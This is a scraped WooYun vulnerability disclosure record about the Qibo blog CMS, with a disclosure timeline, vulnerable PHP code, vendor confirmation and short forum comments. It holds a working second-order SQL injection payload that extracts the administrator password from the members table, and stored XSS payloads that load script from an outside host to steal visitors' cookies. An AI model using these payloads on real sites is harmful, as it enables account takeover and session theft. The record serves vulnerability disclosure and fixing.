{"id": 38501, "wybug_id": "wooyun-2015-096158", "wybug_title": "齐博博客系统高危漏洞集合(SQL+XSS)", "wybug_corp": "齐博CMS", "wybug_author": "小飞", "wybug_date": "2015-02-12 13:00", "wybug_open_date": "2015-05-14 13:00", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["源码审核", "注射漏洞利用技巧", "白盒测试"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-02-12：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-02-13：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-02-16：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2015-04-09：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-04-19：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-04-29：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-05-14：\t细节向公众公开  简要描述： 该博客系统是一个类似博客大巴的公共博客平台两个高危注入+一个可打管理员账号的xss最新的blog 1.0http://down.qibosoft.com/down.php?v=blog1.0 详细说明：  http://localhost/qibo/bk/blog/member/postlog.php?job=postlog注册成会员之后发布日志注入一问题代码\\blog\\member\\postlog.php\nif($job==\"postlog\"){\tif($step==2){\t\tif(!$title){\t\t\tshowerr(\"标题不能为空\");\t\t}elseif(!$content){\t\t\tshowerr(\"内容不能为空\");\t\t}\t\t\t\tif($file_db){\t\t\tforeach( $file_db AS $key=>$value){\t\t\t\tif((eregi(\"jpg$\",$value)||eregi(\"gif$\",$value))&&!eregi(\"sysimage\\/file\",$value)){\t\t\t\t\t$picurl=$value;\t\t\t\t\tbreak;\t\t\t\t}\t\t\t}\t\t}\t\tif($picurl&&($webdb[if_gdimg]))\t\t{\t\t\t$smallpic=\"$picurl.gif\";\t\t\t\t\t\t$Newpicpath=ROOT_PATH.\"$webdb[updir]/$smallpic\";\t\t\tgdpic(ROOT_PATH.\"$webdb[updir]/$picurl\",$Newpicpath,200,150);\t\t\tif( file_exists($Newpicpath) )\t\t\t{\t\t\t\t$picurl=\"$smallpic\";\t\t\t}\t\t\t$ispic=1;\t\t}\t\t\t\t$db->query(\"INSERT INTO `{$pre}blog_log_article` (`title`, `albumid`, `albumname`, `fid`, `fname`,  `posttime`, `list`, `uid`, `username`,`picurl`, `ispic`, `yz`, `keywords`, `ishtml`, `ip`,`content`,passwd,viewtype) VALUES ('$title','$albumid','$albumname','$fid','$fname','$timestamp','$timestamp','$lfjuid','$lfjid','$picurl','$ispic','$yz','$keywords','1','$onlineip','$content','$passwd','$viewtype')\");\t\t@extract($db->get_one(\"SELECT * FROM `{$pre}blog_log_article` ORDER BY id DESC LIMIT 1\"));\t\trefreshto(\"list.php?type=log&job=list\",\"<a href='../index.php?file=viewlog&uid=$lfjuid&id=$id' target='_blank'>查看效果</a> <a href='list.php?type=log&job=list'>返回列表</a> <a href='?job=$job'>继续发表</a>\",600);\n\n\n其中albumname 入库后出库，导致了sql注入\nif($albumid==-1)\t{\t\tif(strlen($newalbum)>30)\t\t{\t\t\tshowerr(\"分类名称不能大于30个字符\");\t\t}\t\telseif($newalbum=='')\t\t{\t\t\t$newalbum=\"新分类\";\t\t}\t\t$db->query(\"INSERT INTO `{$pre}$table_type` ( `name` , `uid` , `list`) VALUES ('$newalbum', '$lfjuid', '$timestamp')\");\t\t@extract($db->get_one(\"SELECT id AS albumid,name AS albumname FROM `{$pre}$table_type` ORDER BY id DESC LIMIT 1\"));\t}\telseif($albumid)\t{\t\t@extract($db->get_one(\"SELECT id AS albumid,name AS albumname FROM `{$pre}$table_type` WHERE id='$albumid' \"));\t}\n但是限制了长度 只能小于30位\nif(strlen($newalbum)>30)\n不过后面的content，passwd无长度限制 而且全部可控，所以造成注入利用注释 分别在两个输入点 注入出管理员密码新建的分类填入a'\\ 创建完成之后 content填入所示\n\n其中content默认有两个2换行 换行会影响注释符号#提交 burp拦截 我们在burp里面抓包去掉就行\n\n\ncontent=*/,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1+and+extractvalue(1,+concat(0x5c,(select+password+from+qb_members+limit+0,1))))#\n\n\n同样的注入二在blog\\member\\postphoto.php\nif($albumid==-1)\t{\t\tif(strlen($newalbum)>30)\t\t{\t\t\tshowerr(\"分类名称不能大于30个字符\");\t\t}\t\telseif($newalbum=='')\t\t{\t\t\t$newalbum=\"新分类\";\t\t}\t\t$db->query(\"INSERT INTO `{$pre}$table_type` ( `name` , `uid` , `list`) VALUES ('$newalbum', '$lfjuid', '$timestamp')\");\t\t@extract($db->get_one(\"SELECT id AS albumid,name AS albumname FROM `{$pre}$table_type` ORDER BY id DESC LIMIT 1\"));\t}\telseif($albumid)\t{\t\t@extract($db->get_one(\"SELECT id AS albumid,name AS albumname FROM `{$pre}$table_type` WHERE id='$albumid' \"));\t}\t}\n问题差不多 不一一演示了XSS发布文章的正文 点击选择源码编辑模式 就可插入xss 其中只粗略过滤了javascript等关键字 但我们知道这远远不够\n\n成功弹窗\n\n我们插入<script/src=//cro.im/2B></script>或者<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://cro.im/2B';> 均可\n\n任意人员（包括管理员）访问 可以看到平台hook加载了\n\n打到了cookies   漏洞证明：  新建的分类填入a'/* 创建完成之后 content填入所示\n\n其中content默认有两个2换行 换行会影响注释符号# 我们在burp里面抓包去掉就行\n\n\ncontent=*/,1,1,1,1,1,1,1,1,1,1,1,1,1,1,1+and+extractvalue(1,+concat(0x5c,(select+password+from+qb_members+limit+0,1))))#\n\n\n\n\n我们插入<script/src=//cro.im/2B></script>或者<img src=x onerror=s=createElement('script');body.appendChild(s);s.src='http://cro.im/2B';> 均可\n\n任意人员（包括管理员）访问 可以看到平台hook加载了\n\n打到了cookies   修复方案：  出库后的albumname 需要addslashesxss过滤需要在源码模式下过滤一些标签比如onerror svg 等等！新年快乐！年前提交的最后一个洞了！挖洞不易啊 给个首页呗！   版权声明：转载请注明来源 小飞@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2015-02-13 12:59 厂商回复： 感谢提出来 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2015-02-12 13:27 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  mark    \n     2015-02-12 19:11 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @roker 看到一个傻逼，。    \n     2015-02-12 19:13 |    \t\troker \t\t\t( 普通白帽子  |\t\t\t        Rank:357 漏洞数:108        )\t\t \n  @′雨。你麻痹。     \n     2015-02-12 20:52 |    \t\t%270x5c \t\t\t( 实习白帽子  |\t\t\t        Rank:64 漏洞数:23        | 乌拉拉)\t\t \n  围观    \n     2015-02-12 22:32 |    \t\t小飞 \t\t\t( 实习白帽子  |\t\t\t        Rank:37 漏洞数:12        | 挖洞对于16岁的我来说实在是太艰难了！10...)\t\t \n  @′雨。 @roker  不是传说雨是@不到的么    \n     2015-02-12 23:24 |    \t\t′雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @小飞 我rename啦    \n     2015-02-12 23:30 |    \t\t走火入魔 \t\t\t( 路人 |\t\t\t        Rank:18 漏洞数:2        | 多读书，多看报，少吃零食，多睡觉。)\t\t \n  @小飞 @′雨。 其实是@    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}